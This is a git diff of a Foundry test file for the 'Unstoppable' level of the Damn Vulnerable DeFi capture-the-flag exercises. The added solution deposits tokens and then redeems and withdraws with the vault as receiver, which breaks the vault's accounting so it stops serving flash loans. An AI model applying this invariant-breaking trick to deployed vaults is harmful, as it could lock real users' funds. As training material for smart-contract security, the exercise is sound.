@@ -32,7 +32,11 @@ contract UnstoppableChallenge is Test {
         startHoax(deployer);
         // Deploy token and vault
         token = new DamnValuableToken();
-        vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});
+        vault = new UnstoppableVault({
+            _token: token,
+            _owner: deployer,
+            _feeRecipient: deployer
+        });
 
         // Deposit tokens to vault
         token.approve(address(vault), TOKENS_IN_VAULT);
@@ -91,7 +95,16 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
+        uint256 amount = 100;
+        address vaultAddress = address(vault);
+        token.approve(vaultAddress, amount);
+        uint256 shares = vault.deposit(amount, player);
+        // vault.redeem and vault.withdrawl will both break the system the 
+        // proceeds are sent to vault
         
+        vault.redeem(shares / 2, vaultAddress, player);
+
+        vault.withdraw(shares / 2, vaultAddress, player);
     }
 
     /**
